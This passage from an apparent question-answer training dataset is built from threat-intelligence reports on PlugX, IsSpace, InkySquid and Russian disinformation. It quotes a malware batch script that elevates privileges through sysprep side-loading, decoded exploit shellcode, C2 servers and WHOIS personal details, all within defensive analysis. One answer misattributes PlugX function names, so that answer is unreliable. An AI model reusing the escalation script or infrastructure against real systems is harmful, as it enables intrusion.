cluster. When a specific implementation of a zero-day appears in separate unrelated instances within a given timeframe (even long after the zero-day was identified and patched), it signifi es code sharing likely pointing to the same actor or activity cluster. Despite discussions of parallel discovery [2] of exploits by different vulnerability researchers in a given timeframe, exploit implementations differ. However, this does not entirely discount the possibility of a double-dealing seller in the black or grey market or other unexpected threat actor interactions like exploit repurposing, as evidenced with Equation team's reuse of CVE-2013-3918 within a couple of days of its initial use by the Aurora actors [3]. One also cannot discount the nefarious possibility that a disclosed exploit repository itself has been hacked, as this represents a boon for an advanced attacker with indisputable return on investment.\nQuestion: How can the reuse of command-and-control infrastructure be utilized to identify the resurfacing or retooling of a threat actor?",
    "output": "Answer: The reuse of command-and-control infrastructure is a significant indicator for identifying the resurfacing or retooling of a threat actor. Since maintaining such infrastructure can be costly and difficult, attackers often reuse it, which allows threat intelligence teams to catalog and track this behavior. Even though multiple attack groups might occasionally use the same vulnerable server, this remains rare and usually occurs within the same threat actor cluster. By monitoring these patterns, researchers can attribute ongoing or new attacks to known threat actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do Network Denial of Service attacks, as described in the Ashmore report on alleged Russian cyber attacks, impact the cyber security of former Soviet satellite states?",
    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users by exhausting the network bandwidth services rely on. In the context of alleged Russian cyber attacks, as detailed in the Ashmore report, Network DoS attacks have been employed to disrupt the cyber security of former Soviet satellite states. Specifically, the report highlights instances of distributed denial of service (DDoS) attacks against Estonia, Georgia, Lithuania, and Kyrgyzstan, which were allegedly linked to Russian involvement. These attacks overwhelmed the targeted countries' internet infrastructure, causing disruptions to government websites, email services, and other critical online resources. The use of botnets and IP address spoofing made it challenging to trace the origin of the attacks, increasing the difficulty in defending against them. Furthermore, the report suggests that the Russian government may have been involved in or sanctioned these attacks, which raises concerns about the potential for state-sponsored cyber aggression. Overall, Network DoS attacks pose a significant threat to the cyber security of former Soviet satellite states, highlighting the need for robust defense mechanisms and international cooperation to counter such threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Template 2: Goldsun\nAt some point they must have realized that it was wrong and tried to fix the CVE-2014-1761 part. For that, they took another recent sample, something similar to those that drop Goldsun Trojans (like this SHA1: e2474cc0da5a79af876771217eb81974e73c39e5)\nIn this case, the RTF only contains the CVE-2014-1761 vulnerability, with an appended executable. The vulnerability expects the second stage shellcode at a fixed file offset, checks a marker string there (\"p!11\"), and jumps to the second stage, which then decrypts and executes the final Win32 payload.\nCVE-2014-1761 exploit and Goldsun shellcode\nMemory marker and Goldsun second stage shellcode\nStart marker and encrypted Goldsun\nMedium Headline: Second attempts\nA large group of samples were created by a sort of a fusion of the Zbot and the Goldsun samples, resulting in a structure like this one:\nSo now there are two different shellcodes. The first, from Plugx, reads the length of the embedded decoy document and Win32 payload from the end of the file, and using this info locates and decrypts the appended payload. This shellcode identifies the host document by checking if the last dword is the same as the dword before that rotated by 3. And the same holds for another two dwords before that. These dwords also store the length of the appended PE payload and decoy document lengths. This structure makes it possible to swap the payload without changing the exploit and shellcode part.\nThe shellcode from Goldsun executes the second stage code from a fixed offset.\nThere are a couple of problems with this implementation. First, the defunctional encrypted Zbot remains in these files, with no purpose at all. But the real problem is with the Goldsun style CVE-2014-1761 block. It was snatched from the CVE-2014-1761 exploiting document, and pasted after the existing Zbot+CVE-2012-0158 combo. Clearly, the offset where the second stage code would be shifted with the different prepended content, but it never happened. As a result, the CVE-2014-1761 exploitation doesn't work, despite all the efforts of the malware authors.\nA couple of distinct malware groups were identified that use these schematics.\nSmall Headline: 21b3e540746816c85e5270a1b8bb58bf713ff5f5\nOriginal name: N/A\nThe dropped decoy document doesn't contain anything, it is only blank page.\nSystem activity\nDropped to C:\\Documents and Settings\\All Users\\DRM\\usta\\usha.exe (clean loader, digitally signed by Kaspersky) and C:\\Documents and Settings\\All Users\\DRM\\usta\\ushata.dll (malware loader) and C:\\Documents and Settings\\All Users\\DRM\\usta\\ushata.dll.avp (payload); registered for startup as a service in HKLM\\SYSTEM\\CurrentControlSet\\Services\\usta \u2192 ImagePath\nThe payload is next generation Plugx,4 plugin function creation dates are 0x20130810\nC&C servers\nwww.notebookhk.net\nRegistry Registrant ID:\nRegistrant Name: lee stan\nRegistrant Organization: lee stan\nRegistrant Street: xianggangdiqu\nRegistrant City: xianggangdiqu\nRegistrant State: xianggang\nRegistrant Postal Code: 796373\nRegistrant Country: HK\nRegistrant Phone: +0.04375094543\nRegistrant Fax: +0.04375094543\nRegistrant Email: stanlee@gmail.com\nSmall Headline: 80f965432ce872fc3592d9f907d5a4f66ab07f9c\nOriginal name: \u0421\u043f\u0440\u0430\u0432\u043a\u0430 \u043e\u0442 16.09.2014.doc\nSystem activity\nDropped to C:\\Documents and Settings\\All Users\\DRM\\AShld\\AShld.exe (clean loader, digitally signed by McAfee) and C:\\Documents and Settings\\All Users\\DRM\\AShld\\AShldRes.DLL (malware loader) and C:\\Documents and Settings\\All Users\\DRM\\AShld\\AShldRes.DLL.asr (payload); registered for startup as a service in HKLM\\SYSTEM\\CurrentControlSet\\Services\\ AShld \u2192 ImagePath\nThe payload is next generation Plugx,4 plugin function creation dates are 0x20130810.\nC&C servers\ndwm.dnsedc.com\nRegistry Registrant ID:\nRegistrant Name: qiuping liu\nRegistrant Organization: huajiyoutian\nRegistrant Street: beijing\nRegistrant City: Beijing\nRegistrant State/Province: BJ\nRegistrant Postal Code: 100191\nRegistrant Country: CN\nRegistrant Phone: +86.1052810955\nRegistrant Phone Ext:\nRegistrant Fax: +89.1052810955\nRegistrant Fax Ext:\nRegistrant Email: yuminga1@126.com\nTwo of the Plugx samples turned out to be very new developments. Similar samples were just recently encountered from the list generated by a researcher.5\n176273806e6fe338123ff660e70145935bac77c3\nOriginal name: \u0420\u0415\u0417\u042e\u041c\u0415.doc\nSystem activity\nDropped to C:\\Documents and Settings\\All Users\\DRM\\KavSky\\msinfo.exe (clean loader by Kaspersky) and C:\\Documents and Settings\\All Users\\DRM\\KavSky\\msi.dll (malware loader) and C:\\Documents and Settings\\All Users\\DRM\\KavSky\\msi.dll.eng (payload); registered in for startup as a service in HKLM\\SYSTEM\\CurrentControlSet\\Services\\KavSky \u2192 ImagePath\nThe payload is next generation Plugx [4], plugin function creation dates are 20140719 (and interestingly, decimal and not hexadecimal, as generally seen in Plugx). Additionally, it has some internal function names not seen in earlier Plugx versions: ZX, ZXWT, JP1, JP2, JP3, JP4, JP5, JAP0, JAP1\nC&C servers\nfuturesgolda.com\nRegistry Registrant ID:\nRegistrant Name: qiuping liu\nRegistrant Organization: huajiyoutian\nRegistrant Street: beijing\nRegistrant City: Beijing\nRegistrant State/Province: BJ\nRegistrant Postal Code: 100191\nRegistrant Country: CN\nRegistrant Phone: +86.1052810955\nRegistrant Phone Ext:\nRegistrant Fax: +89.1052810955\nRegistrant Fax Ext:\nRegistrant Email: yuminga1@126.com\nadobeflashupdate.dynu.com\nDynamic DNS service\nsystemupdate5.dtdns.com\nDynamic DNS service\n4ad76ce333b38c5bdd558e3d76640fa322e3cca6\nOriginal name: 2014 Chairmanship_end.doc\nSystem activity\nDropped to C:\\Documents and Settings\\All Users\\DRM\\KavSky\\m.exe (clean loader, digitally signed by Kaspersky) and C:\\Documents and Settings\\All Users\\DRM\\KavSky\\msi.dll (malware loader) and C:\\Documents and Settings\\All Users\\DRM\\KavSky\\msi.dll.eng (payload); registered in for startup as a service in HKLM\\SYSTEM\\CurrentControlSet\\Services\\KavSky \u2192 ImagePath\nThe payload is next generation Plugx,4 plugin function creation dates are 20140719 decimal. Additionally, it has some internal function names not seen in earlier Plugx versions: ZX, ZXWT, JP1, JP2, JP3, JP4, JP5, JAP0, JAP1\nThis sample used a Myanmar related decoy theme, likely part of a separate distribution campaign.\nC&C servers\nindiasceus.jetos.com\nDynamic DNS service\nindiasceus.justdied.com\nDynamic DNS service\nMedium Headline: Appat\nThese are new Trojans. Not connected to Plugx at code level, but the overlap between the C&C servers, the same domain registration contact (yuminga1@126.com), and the similar Russian theme indicates that the same group deployed them.\n0dfd883c1f205f0740d50688683f1869bcc0e9d7\nOriginal name: \u041f\u043b\u0430\u043d \u043a\u043e\u0441\u043c\u0438\u0447\u0435\u0441\u043a\u043e\u0439 \u0434\u0435\u044f\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438 \u043d\u0430 2021-2025 \u0433\u043e\u0434.doc\nSystem activity\nDropped to %WINDOWS%\\AppPatch\\AcProtect.dll (SHA1: 994be9c340f57ba8cbb20b7ceedad49b00294f3e) and %WINDOWS%\\AppPatch\\msimain.mui (separate payload file).\nRegistered for startup with unusual autostart method, briefly touched in.7\nA Microsoft patch file is dropped to %WINDOWS%\\AppPatch\\Custom\\{099BF1AE-6A93493D-0C48-2453E7FBC801}.sdband registered to load in HKLM\\SOFTWARE\\Microsoft\\ Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB. That file loads AcProtect.dll as a library component.\nThe dumped payload shows similar functionality to what Plugx (or any other general purpose backdoor) has, but on a code level it is very different.\nC&C servers\nadobeflashupdate.dynu.com\nDynamic DNS service\ntransactiona.com\nDomain Status: clientTransferProhibited\nRegistry Registrant ID:\nRegistrant Name: qiuping liu\nRegistrant Organization: huajiyoutian\nRegistrant Street: beijing\nRegistrant City: Beijing\nRegistrant State/Province: BJ\nRegistrant Postal Code: 100191\nRegistrant Country: CN\nRegistrant Phone: +86.1052810955\nRegistrant Phone Ext:\nRegistrant Fax: +89.1052810955\nRegistrant Fax Ext:\nRegistrant Email: yuminga1@126.com\nsystemupdate5.dtdns.com\nDynamic DNS service\nSmall Headline: Farfli: 960ac7329a6e80682959d6da0469921f8167e79a\nOriginal name: MoFA Note- Verbale on 19.8.14.doc\nSystem activity\nDropped to %PROFILE%\\Application Data\\winlog.exe (SHA1:\n511f2055a56c0f458b1b14cc207730d0fe639df4) and %PROFILE%\\Application Data\\winlog.dll\n(SHA1: bb185efd35f7b4892a32e7853e044e94502a36af)\nC&C servers\nunisers.com\nDomain Status: clientTransferProhibited\nRegistry Registrant ID:\nRegistrant Name: wang cheng\nRegistrant Organization: wang cheng\nRegistrant Street: BeijingDaguoROAD136\nRegistrant City: Beijing\nRegistrant State: Beijing\nRegistrant Postal Code: 100001\nRegistrant Country: CN\nRegistrant Phone: +86.01085452454\nRegistrant Fax: +86.01085452454\nRegistrant Email: bitumberls.@163.com\n\nWhat were the system activities and characteristics of the Plugx samples mentioned in the report, and how did they differ from each other?",
    "output": "The Plugx samples mentioned in the report exhibited specific system activities and characteristics. For example, the sample with SHA1 '21b3e540746816c85e5270a1b8bb58bf713ff5f5' dropped a clean loader digitally signed by Kaspersky and a malware loader, registered for startup as a service. The payload was a next-generation Plugx with plugin function creation dates of 0x20130810. Another sample, '80f965432ce872fc3592d9f907d5a4f66ab07f9c', dropped a clean loader digitally signed by McAfee and a malware loader, also registered for startup as a service. The payload was a next-generation Plugx with the same plugin function creation dates. The samples differed in their C&C servers and some internal function names, with the latter sample having additional function names like ZX, ZXWT, JP1, JP2, JP3, JP4, JP5, JAP0, JAP1.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Exploit Details\nThe CVE-2015-5122 exploit found within the Flash file is nearly identical to the original proof of concept (POC) disclosed publically from the Hacking Team data breach. An (<http://blog.trendmicro.com/trendlabs-security-intelligence/another-zero-day-vulnerability-arises-from-hacking-team-data-leak/>)analysis by Trend Micro covers the POC in detail. Unlike the POC mentioned in the Trend Micro report, this particular exploit file was weaponized, and, instead of loading calc.exe, a much more malicious file was loaded. As seen in Figure 1, the embedded shellcode is obfuscated using the same technique of representing bytes as integers and exponential numbers. However it appears that the adversary did not modify the POC much, as the variable name 'calc' remains unchanged.\nThese values can be converted into their byte representations using a simple Python script, truncated here for brevity.\n>>> import struct\n>>> shellcode = [2.179763029E9,286956,2.425377536E9,2.2444484E9,4.29496648E9,1094795585]\n>>> for s in shellcode:\n... print repr(struct.pack(\"I\", s))\n...\n'U\\x8b\\xec\\x81'\n'\\xec`\\x04\\x00'\n'\\x00S\\x90\\x90'\n'\\x90\\x90\\xc7\\x85'\n'\\xd0\\xfc\\xff\\xff'\n'AAAA'\nLooking at the shellcode in further detail shows a fairly simplistic instruction set. Functions are loaded dynamically, and a file is dropped to %TEMP%\\Rdws.exe before being executed using the WinExec Windows API call.\nReturning to the Flash exploit, we discover that the dropped file is embedded within the Flash file itself as ByteArray. This binary data is loaded and decompressed with ZLIB prior to being stored in a newly allocated section of memory. The address of this binary data is then stored in the shellcode before it is executed.\nAfter successful execution, a binary with the following attributes is executed on the victim's machine.\nBig Headline: Malware Details\nAs seen by the compile timestamp, this malware sample is not extremely current. The timestamp shows a compile date of November 14, 2014, which indicates that the infrastructure used by this particular sample has remained intact for quite some time, relatively speaking. Analysis of the malware indicates that this sample is highly likely to be the Trojan tool IsSpace, which shares similar code and behaviors as the NFlog tool.\nWhen comparing IsSpace to NFlog, we noticed a number of changes have been made. When initially run, the malware attempts to write log messages to 'C:\\ProgramData\\log[.]txt' indicating that this variant was intended to run on Microsoft Windows 7 or higher. However, it still maintains the capability to run on operating systems earlier than Microsoft Windows 7 if needed. IsSpace creates an event named\n'MdQ0784kd' to ensure that only a single instance of the malware is running at any given time on an infected host.\nTo determine the flow of execution, IsSpace gathers various data about the infected host, such as administrative rights of the user, operating system version, and CPU architecture.\nIf IsSpace determines that it is running as an administrator on a Microsoft Windows 7 system on a 32-bit platform, it will attempt to execute itself accordingly, using a side-loading technique. The malware will drop a cabinet file and batch script to the following locations:\n%TEMP%\\FASAP.DAT\n%TEMP%\\FASAPI.bat\nThe batch script contains the following:\n@echo off ping localhost start wusa [%TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\ ping localhost ping localhost ping localhost ping localhost ping localhost start %windir%\\system32\\sysprep\\sysprep.exe \"[CWD]\\[Malware].EXE\"\n@echo off ping localhost start wusa [%TEMP%]\\FASAP.DAT /quiet /extract:%windir%\\system32\\sysprep\\ ping localhost ping localhost ping localhost ping localhost ping localhost start %windir%\\system32\\sysprep\\sysprep.exe \"[CWD]\\[Malware].EXE\"\n[CWD] is the directory where the malware was run from and [%TEMP%] is the full path of the %TEMP% directory.\nThe batch script will first extract the cabinet file to the sysprep directory. The extracted file is a 32-bit DLL with the name 'CryptBase.dll.' The batch script continues to execute sysprep.exe after approximately 5 seconds, which will automatically load the dropped CryptBase.dll file. This DLL will execute the provided argument in a child process. This newly created process has elevated privileges as it is spawned by\nsysprep.exe.\nA similar process is taken for 64-bit systems. However, instead of dropping a batch script, a 64-bit executable along with a cabinet file containing a 64-bit version of CryptBase.dll is dropped to the following path instead:\n%TEMP%\\FASAPI.bin\n%TEMP%\\FASAP.DAT\nThis executable is then run in a new process. It is responsible for unpacking the cabinet file and spawning a new instance of sysprep.exe.\nIf the malware detects that it is running on a Windows XP host, it will attempt to check for Internet connectivity by making a HTTP request to (<http://www.microsoft.com/>)www.microsoft.com. This is similar to characteristics observed in the NFlog backdoor, with the primary deviation being that this activity only takes place when running in a Windows XP environment with IsSpace.\nIsSpace proceeds to make HTTP requests to 172.246.109.27, which appears to be its primary command and control (C2) server. The initial HTTP request is made to '//STTip.asp.' Note the extra leading forward slash. This is likely an unfortunate side effect of the malware expecting a subdirectory in the URI path. As this particular sample did not supply one, the extra slash is seen. An example request made can be seen below:\nAfter the initial beacon, IsSpace will exfiltrate victim information by making an HTTP request to '//SNews.asp?HostID=xx-xx-xx-xx-xx-xx', where the HostID contains the victim's MAC address. The POST data sent in this request is encrypted using the same four-byte XOR key of '\\x35\\x8E\\x9D\\x7A' that has been used by the NFlog tool.\nThe decrypted information contains data similar to the following:\n'60-F8-1D-CC-2F-CF#%##%#172.16.95.137#%#WIN-\nLJLV2NKIOKP#%#Win7#%#English(US)#%#2015-07-17\n09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'\n'60-F8-1D-CC-2F-CF#%##%#172.16.95.137#%#WIN-LJLV2NKIOKP#%#Win7#%#English(US)#%#2015-07-17 09:31:57#%#Active#%#303_20140401#%#IsAdmins#%#IsSpace'\nOnce again, the exfiltrated data is very similar to what has been used by NFlog; however with IsSpace, the victim's user privilege level is also included, in addition to a variable of either 'IsSpace' or 'IsGoogle.' This particular variable is still under investigation by Unit 42. Additionally, we see what is likely a campaign code of '303_20140401'.\nAfter the successful check-in and initial exfiltration, IsSpace will then accept the following commands:\nIsSpace provides attackers with a foothold into the victim's machine and/or network. While the malware itself provides limited functionality, it allows attackers to perform minimal reconnaissance and deploy further malware onto the device.\nBig Headline: Infrastructure\nThe IP 172.246.109.27 is hardcoded in the IsSpace sample and is likely to be the primary C2 server. Pivoting off of this primary C2 IP address using passive DNS data, we located seven domain names and two additional IP addresses that may be related to this attack. Three of the domains found used the prefix 'ssl' or 'dns' as the third level domain; this tactic is commonly used by malware authors as an evasion method.\nExamining the WHOIS data for the domains revealed additional intelligence on possible attribution. Specifically, the WHOIS data showed the start-vedioing[.]net to be allegedly registered to an entity in Japan:\nRegistry Registrant ID:\nRegistrant Name: Alta Rohde\nRegistrant Organization:\nRegistrant Street: tokoy\nRegistrant Street: tokoy\nRegistrant City: tokoy\nRegistrant State/Province: Aomori\nRegistrant Postal Code: 236521\nRegistrant Country: Japan\nRegistrant Phone: +81.21244215\nRegistrant Phone Ext:\nRegistrant Fax:\nRegistrant Fax Ext:\nRegistrant Email: alta.rohde@inbox[.]com\nAnd the anywhere-staring[.]com was found to be allegedly registered to an entity in China:\nRegistry Registrant ID:\nRegistrant Name: lan fei\nRegistrant Organization:\nRegistrant Street: tian jing lu 244\nRegistrant City: bei da\nRegistrant State/Province: qing nao\nRegistrant Postal Code: 888000\nRegistrant Country: China\nRegistrant Phone: +86.13877554411\nRegistrant Phone Ext:\nRegistrant Fax:\nRegistrant Fax Ext:\nRegistrant Email: csolyc110@163[.]com\nThe geographic regions indicated in the WHOIS data are consistent with campaigns previously associated with NFlog, showing that the adversaries attributed to this malware were highly likely to be operating out of Southeast Asia. IsSpace is a newer variant of the NFlog malware family, and contains many similarities in its behavior and code base. It is highly likely that adversary groups that have historically used NFlog are now using IsSpace.\nBig Headline: Conclusion\nAdversaries continue to exploit easily accessible vulnerabilities and readily re-use exploit code and payloads, largely due to their efficacy. This type of behavior and activity is expected to continue for the near future due to the multiple vulnerabilities disclosed by the Hacking Team data breach.\nAs with many other previously disclosed advanced attacks, relying purely on a detection-based model for security is ineffective when IOCs are either unknown or are not readily available for ingestion. Thus, it is (<https://www.paloaltonetworks.com/products/technologies/wildfire.html>)imperative that organizations deploy automated, behavior-based preventative measures such as Palo Alto Networks WildFire or to reduce the risk of unknown attacks.\nPalo Alto Networks customers using WildFire are protected from this campaign. Additionally, IPS signature (<https://threatvault.paloaltonetworks.com/Home/ThreatDetail/14365>)14365 detects IsSpace command and control traffic inside a network.\n\nQuestion: How does the analysis of the WHOIS data for the domains related to the IsSpace C2 server contribute to the attribution of the attack?\n\nAnswer:",
    "output": "The WHOIS data for the domains related to the IsSpace C2 server reveals that they are allegedly registered to entities in Japan and China. This geographic distribution is consistent with campaigns previously associated with NFlog, suggesting that the adversaries attributed to this malware are likely operating out of Southeast Asia. This information supports the hypothesis that adversary groups historically using NFlog are now employing IsSpace.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1.1 Introduction - Building upon GhostNet\nResearch into computer network exploitation, cyber espionage, malware and botnets has expanded in recent years from a relatively small cottage industry involving primarily technical experts to a major global phenomenon which now includes academia, defence, intelligence, law enforcement, and the private sector. The rapid rise of this industry is in part a recognition of the significant threat that these global criminal ecosystems represent to critical infrastructure, government systems, personal privacy, commerce, and defense. Several high profile cases and events, including the attacks on Google and other American companies in December 2009, underscore the growing threat environment and suggest that these attacks are becoming the norm rather than an exception. Policymakers are responding with legislation, institutional reforms and new initiatives, and an already sizable market for cyber security services is mushrooming into a multi-billion dollar global industry.\nThis report aims to contribute to research and debate in this domain. Its release is strategic, coming roughly one year after the publication of Tracking GhostNet (See Box 1, below).\n\nQ: How did the increasing recognition of threats posed by global criminal ecosystems influence the growth and response of the cyber security industry, particularly in the context of the Shadowserver APT?",
    "output": "A: The increasing recognition of threats posed by global criminal ecosystems led to a significant expansion of the cyber security industry from a niche field involving primarily technical experts to a major global phenomenon encompassing academia, defense, intelligence, law enforcement, and the private sector. This growth was driven by the realization that these threats pose serious risks to critical infrastructure, government systems, personal privacy, commerce, and defense. High-profile incidents, such as the attacks on Google and other American companies in December 2009, highlighted the escalating threat environment and indicated that such attacks were becoming commonplace. In response, policymakers introduced legislation, institutional reforms, and new initiatives, while the market for cyber security services grew into a multi-billion dollar global industry. This report on Shadowserver aims to contribute to ongoing research and debate in this domain, building upon previous work such as the publication of 'Tracking GhostNet'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nNorth Korean APT InkySquid Infects Victims Using Browser Exploits\nAugust 17, 2021\nby Damien Cash, Josh Grunzweig, Matthew Meltzer, Steven Adair, Thomas Lancaster\nVolexity recently investigated a strategic web compromise (SWC) of the website of the Daily NK (www.dailynk[.]com), a South Korean online newspaper that focuses on issues relating to North Korea. Malicious code on the Daily NK website was observed from at least late March 2021 until early June 2021.\nThis post provides details on the different exploits used in the SWC, as well as the payload used, which Volexity calls BLUELIGHT. Volexity attributes the activity described in this post to a threat actor Volexity refers to as InkySquid, which broadly corresponds to activity known publicly under the monikers ScarCruft and APT37.\n\nHow does the North Korean APT group InkySquid leverage browser exploits to infect victims, and what specific payload did they use in their strategic web compromise of the Daily NK website? Additionally, explain how this tactic can help cybersecurity experts better understand and defend against similar attacks.",
    "output": "The North Korean APT group InkySquid leverages browser exploits by embedding malicious code into legitimate websites, a tactic known as a strategic web compromise (SWC). In the case of the Daily NK website, malicious code was present from at least late March 2021 until early June 2021. This malicious code exploited vulnerabilities in users' browsers to infect their systems. The payload used in this attack was called BLUELIGHT. Understanding this tactic helps cybersecurity experts recognize the importance of monitoring and securing web applications, as well as the need for regular patching and updating of browsers to mitigate vulnerabilities. It also highlights the necessity of implementing robust intrusion detection systems and conducting regular security audits to detect and respond to such compromises promptly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 5 Social Media in the Russian-Ukrainian Conflict\nDuring the war in Ukraine, social media has become home to intense conflict-related information updates, impassioned arguments, and debate.6 The social media space has been abused, and pro-Russian forces have given the world a masterclass.\nAt the beginning of the conflict, we saw strategic communications in action. Over Twitter and YouTube, unknown attackers released an intercepted phone conversation between the U.S. Assistant Secretary of State Victoria Nuland and Geoffrey Pyatt, the U.S. Ambassador to Ukraine.7 In one stroke, the perpetrators sought to discredit Western policy and to announce their access to Western lines of government communication. Thus we saw both a technical exploit on an information system and a psychological attack on the West via social media.\nDuring the course of the conflict, Russia's narrative has been tightly scripted and disseminated, both on traditional media (in 'breaking' and 'eyewitness' accounts on television) and in cyberspace via social media. These venues are mutually reinforcing, encompassing older and younger readers with varying degrees of access to technology. For example, one can no longer watch Ukrainian television in eastern Ukraine; similarly, Russian television channels are no longer available in western Ukraine.\n6 See, for example, Irina Anilovskaja. \u0412\u043e\u0439\u043d\u0430: \u043f\u0435\u0440\u0435\u043f\u0438\u0441\u043a\u0430 \u043e\u0434\u043d\u043e\u043a\u043b\u0430\u0441\u0441\u043d\u0438\u043a\u043e\u0432, Alfra Reklama, 2014.\n7 Anne Gearan. 'In recording of U.S. diplomat, blunt talk on Ukraine' Washington Post, 6 February 2014, https://www.washing-tonpost.com/world/national-security/in-purported-recording-of-us-diplomat-blunt-talk-on-ukraine/2014/02/06/518240a48f4b-11e3-84e1-27626c5ef5fb_story.html.\nOn social media, pro-Russian voices have systemically cultivated fear, anxiety, and hate among the ethnically Russian (and other non-Ukrainian populations) of Ukraine. They have manipulated and distributed images of purported atrocities by the Ukrainian army, including: mass graves of tortured people, civilians used for organ trafficking, burning crops to create a famine, recruiting child soldiers, the use of heavy weapons against civilians, and acts of cannibalism.8\nVia social media, such information \u2013 whether offered with some evidence or merely in the form of rumours \u2013 often criss-crosses the globe in minutes, and a well-organised social media campaign can easily influence a target population's perceptions and behaviours.\nThe Latvian media company LETA conducted an analysis of Twitter posts during the first six months of 2014, and identified an increasing polarisation between pro-Russian and pro-Ukrainian social media users as the conflict escalated, especially following the violence in Odessa.9 The researchers wrote that 12.2% of all tweets related to the conflict in eastern Ukraine were 'aggressive', dominated by pro-Russian stances, most intense relative to human casualties, and included epithets such as 'fascist' and 'ruscist'.10\nNumerous social media postings appear to be disseminated in order to manipulate people in eastern Ukraine.\nThe conflict in Ukraine has seen numerous social media postings that appear to be deliberately disseminated in order to manipulate people in eastern Ukraine and beyond. During the May 2014 violence in Odessa, someone posted the following to Facebook:\n[English translation] 'Hello. My name is Igor Rosovskiy. I am 39 years old. I live in the city of Odessa. I have worked as an emergency physician for 15 years. Yesterday, as you know, there was a terrible tragedy in our city, some people killed other people. They killed them in a brutal way by burning them alive, not in a drunken stupor, not to get their grandmother's inheritance, but because they share the political views of nationalists. First they brutally beat their victims, then burned them alive. As a doctor, I rushed to help those whom I could save, but the fighters stopped me. They didn't let me go to the wounded. One rudely pushed me, promising that I and other Jews would suffer a similar fate. I saw a young man I could have saved if I could have taken him to the hospital, but my attempts at persuasion were met with a blow to the face and lost glasses. In fifteen years I have seen much, but yesterday I wanted to cry, not from the blows and humiliation,\nbut from my helplessness in being unable to do anything. In my city, such things did not happen even during the worst times of Nazi occupation. I wonder why the world is silent.'\n8 More information about the false information related to Russian \u2013 Ukrainian can be found at StopFake.org, 21 August 2014, (<http://www.stopfake.org/en/russia-s-top-100-lies-about-ukraine/>)http://www.stopfake.org/en/russia-s-top-100-lies-about-ukraine/\n9 G.C. 'Ukraine's murky inferno: Odessa's fire examined.' The Economist Eastern Approaches blog. 8 May 2014, http://www.economist.com/blogs/easternapproaches/2014/05/odessas-fire-examined.\n10 'Ruscist' is an invented word with offensive meaning, a combination of the words 'Russian' and 'fascist'.\nThe Russian-language social networking website Vkontakte saw more than 5,000 shares of this post within 24 hours, and it was quickly translated into English, German, and Bulgarian. However, analysts subsequently discovered that Dr. Rozovs-kiy's profile picture was actually that of a dentist from the North Caucasus, and now believe this social media post to be a hoax.11\nOn 4 June 2014, Pavel Astakhov, the Children's Ombudsman under the President of the Russian Federation, announced on his Instagram account that 'more than 7,000' Ukrainian refugees had fled Ukraine and arrived in the Rostov Oblast in the previous 24 hours. The next day, that number had risen to 8,386. Russian mass media reported these numbers, but Rostov authorities apparently contradicted them, where the Governor's office reported that the number of refugees did not exceed 712.12\nIn July 2014, 3-year-old boy was allegedly tortured and crucified by the Ukrainian military in a public square in Slovyansk, Ukraine. The Russian state-run TV Channel One broadcast the 'eyewitness' testimony of Galina Pyshnyak, who stated that she and others were forcibly brought to the central square to witness the public execution. The interview took place at a refugee camp in Russia's Rostov region and was widely disseminated on social media.13 However, Russian journalist Yevgeny Feldman of Novaya Gazeta, as well as journalists from Russia's independent channel Dozhd, challenged the report with contradictory testimonies from multiple interviews in Slovyank, in which numerous residents denied any knowledge of the incident.14\nThroughout 2014, the list of rumours from eastern Ukraine grew to be quite long: the Kyiv government and European Union were building concentration camps; the forest was full of right-wing killers; the May 9 Victory Day holiday had been cancelled;15 property would be confiscated; and use of the Russian language was prohibited. On one occasion, terrified locals called the Donbas Water Company after social media informed them that the region's water supply had been poisoned.16\nThese stories can be contrasted with the 'Polite People' campaign on Vkontakte, which supported the Russian invasion of Crimea with pictures of Russian troops posing alongside girls, mothers with children, the elderly, and pets.17\n11  'Odesa Doctor Or Random Dentist? Claims Of Atrocities, Anti-Semitism Face Scrutiny,' Radio Free Europe/Radio Liberty, 27 June 2015, (<http://www.rferl.org/content/ukraine-unspun-odesa-doctor-dentist-false-claim/25372684.html>)http://www.rferl.org/content/ukraine-unspun-odesa-doctor-dentist-false-claim/25372684.html.\n12 'Rostov officials refuted information about thousands of Ukrainian refugees,' StopFake.org, 6 June 2014, (<http://www.stopfake.org/en/rostov-officials-refuted-information-about-thousands-of-ukrainian-refugees/>)http://www.stopfake. (<http://www.stopfake.org/en/rostov-officials-refuted-information-about-thousands-of-ukrainian-refugees/>)org/en/rostov-officials-refuted-information-about-thousands-of-ukrainian-refugees/.\n13 '\u0411\u0435\u0436\u0435\u043d\u043a\u0430 \u0438\u0437 \u0421\u043b\u0430\u0432\u044f\u043d\u0441\u043a\u0430 \u0432\u0441\u043f\u043e\u043c\u0438\u043d\u0430\u0435\u0442, \u043a\u0430\u043a \u043f\u0440\u0438 \u043d\u0435\u0439 \u043a\u0430\u0437\u043d\u0438\u043b\u0438 \u043c\u0430\u043b\u0435\u043d\u044c\u043a\u043e\u0433\u043e \u0441\u044b\u043d\u0430 \u0438 \u0436\u0435\u043d\u0443 \u043e\u043f\u043e\u043b\u0447\u0435\u043d\u0446\u0430,' \u041f\u0435\u0440\u0432\u044b\u0439 \u043a\u0430\u043d\u0430\u043b, 12 July 2014, (<http://www.1tv.ru/news/world/262978>)http://www.1tv.ru/news/world/262978.\n14 \u0415\u0432\u0433\u0435\u043d\u0438\u0439 \u0424\u0435\u043b\u044c\u0434\u043c\u0430\u043d, \u0416\u0438\u0442\u0435\u043b\u0438 \u0421\u043b\u0430\u0432\u044f\u043d\u0441\u043a\u0430 \u2013 \u043e \u0442\u043e\u043c, \u0431\u044b\u043b \u043b\u0438 \u0440\u0430\u0441\u043f\u044f\u0442\u044b\u0439 \u043c\u0430\u043b\u044c\u0447\u0438\u043a 